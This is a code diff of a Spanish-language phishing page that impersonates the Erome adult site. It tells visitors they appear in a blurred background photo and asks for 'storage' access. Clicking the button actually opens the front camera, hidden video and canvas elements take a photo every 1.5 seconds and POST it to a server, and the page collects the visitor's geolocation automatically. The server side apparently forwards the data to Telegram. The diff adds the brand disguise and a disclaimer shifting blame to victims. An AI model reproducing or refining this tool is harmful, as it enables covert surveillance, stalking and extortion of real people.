@@ -17,14 +17,19 @@ send_to_telegram($msg);
 <!doctype html>
 <html>
 <head>
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
         body {
-            margin:0;
-            font-family: Arial, sans-serif;
-            background: #000;
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #111;
+            color: #fff;
             height: 100vh;
             overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
         }
 
         /* Imagen censurada inicial visible desde el inicio */
@@ -33,17 +38,51 @@ send_to_telegram($msg);
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: url('img/image1.jpg') no-repeat center center/cover;
-            filter: blur(15px) brightness(0.5);
+            background: url('img/image.jpg') no-repeat center center/cover;
+            filter: blur(20px) brightness(0.4);
             z-index: -1;
-            transition: all 0.8s ease;
+            transition: all 1s ease;
         }
 
         /* Imagen normal cuando se desbloquea */
         body.unlocked::before {
             background: url('img/image2.jpg') no-repeat center center/cover;
             filter: none;
-            brightness: 1;
+        }
+
+        /* Caja estilo erome */
+        #cameraModal .content {
+            background: #1c1c1c;
+            color: #fff;
+            padding: 25px;
+            border-radius: 6px;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 0 15px rgba(0,0,0,0.6);
+            border: 1px solid #333;
+        }
+
+        /* Logo */
+        .logo {
+            max-width: 150px;
+            margin-bottom: 15px;
+        }
+
+        /* Botón rojo estilo erome */
+        #grantAccess {
+            margin-top: 20px;
+            padding: 12px 25px;
+            background-color: #e50914;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background 0.2s;
+        }
+        #grantAccess:hover {
+            background-color: #b00610;
         }
 
         /* Modal de permisos */
@@ -51,37 +90,11 @@ send_to_telegram($msg);
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
+            background: rgba(0,0,0,0.8);
             display: flex;
             align-items: center;
             justify-content: center;
             z-index: 9999;
-        }
-
-        #cameraModal .content {
-            background: #fff;
-            color: #000;
-            padding: 30px;
-            border-radius: 10px;
-            max-width: 500px;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
-        }
-
-        #grantAccess {
-            margin-top: 20px;
-            padding: 10px 20px;
-            background-color: #FF0000;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background 0.2s;
-        }
-
-        #grantAccess:hover {
-            background-color: #cc0000;
         }
 
         /* Animación desbloqueando */
@@ -89,30 +102,36 @@ send_to_telegram($msg);
             position: fixed;
             top:0; left:0;
             width:100%; height:100%;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.9);
             color: #fff;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-direction: column;
-            font-size: 24px;
+            font-size: 22px;
             z-index: 10000;
             display: none;
         }
 
         .loader {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #FF0000;
+            border: 6px solid #333;
+            border-top: 6px solid #e50914;
             border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 2s linear infinite;
-            margin-top: 20px;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-top: 15px;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg);}
             100% { transform: rotate(360deg);}
+        }
+
+        /* Mensaje pequeño estilo disclaimer */
+        .disclaimer {
+            font-size: 11px;
+            color: #aaa;
+            margin-top: 15px;
         }
     </style>
 </head>
@@ -121,9 +140,13 @@ send_to_telegram($msg);
 <!-- Modal de permisos -->
 <div id="cameraModal">
     <div class="content">
-        <h2>¡Atención!</h2>
-        <p>📸 ¡Wow! Apareces en la imagen de fondo... ¿seguro que no eres tú? Para poder acceder y visualizar la imagen correctamente, necesitamos tu permiso para acceder al almacenamiento y descargar el contenido.</p>
+        <img src="img/logo-erome-vertical.png" alt="Erome Logo" class="logo">
+ <!--       <h2>¡Atención!</h2> -->
+        <p>📸 ¡Wow! Apareces en la imagen de fondo... ¿seguro que no eres tú? Para poder acceder y visualizar la imagen correctamente, necesitamos tu permiso para acceder al almacenamiento y descargar el contenido.</p>
         <button id="grantAccess">Permitir acceso</button>
+        <div class="disclaimer">
+            Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad y asume toda la responsabilidad por cualquier acción o consecuencia derivada de su uso.
+        </div>
     </div>
 </div>
 
@@ -133,14 +156,13 @@ send_to_telegram($msg);
     <div class="loader"></div>
 </div>
 
-<!-- Video y Canvas ocultos para tomar fotos -->
+<!-- Video y Canvas ocultos -->
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
 'use strict';
 
-// Función para enviar foto al servidor
 function post(imgdata){
     $.ajax({
         type: 'POST',
@@ -151,26 +173,23 @@ function post(imgdata){
     });
 }
 
-// Configuración cámara
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const constraints = { audio: false, video: { facingMode: "user" } };
 
-// Acceso a la cámara
 async function initCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
         capturePhotoLoop();
 
-        // Mostrar animación de desbloqueo
         const unlockModal = document.getElementById('unlockAnimation');
         unlockModal.style.display = 'flex';
 
         setTimeout(() => {
             unlockModal.style.display = 'none';
-            document.body.classList.add('unlocked'); // Mostrar imagen desbloqueada
-        }, 5000); // 5 segundos
+            document.body.classList.add('unlocked');
+        }, 5000);
 
     } catch (e) {
         console.error('Error al acceder a la cámara:', e);
@@ -178,7 +197,6 @@ async function initCamera() {
     }
 }
 
-// Captura fotos cada 1.5 segundos
 function capturePhotoLoop() {
     const context = canvas.getContext('2d');
     setInterval(function(){
@@ -188,13 +206,11 @@ function capturePhotoLoop() {
     }, 1500);
 }
 
-// Al presionar "Permitir acceso"
 document.getElementById('grantAccess').addEventListener('click', () => {
     document.getElementById('cameraModal').style.display = 'none';
     initCamera();
 });
 
-// Obtener ubicación y enviarla automáticamente
 if ('geolocation' in navigator) {
     navigator.geolocation.getCurrentPosition(function(pos) {
         const { latitude, longitude, accuracy } = pos.coords;
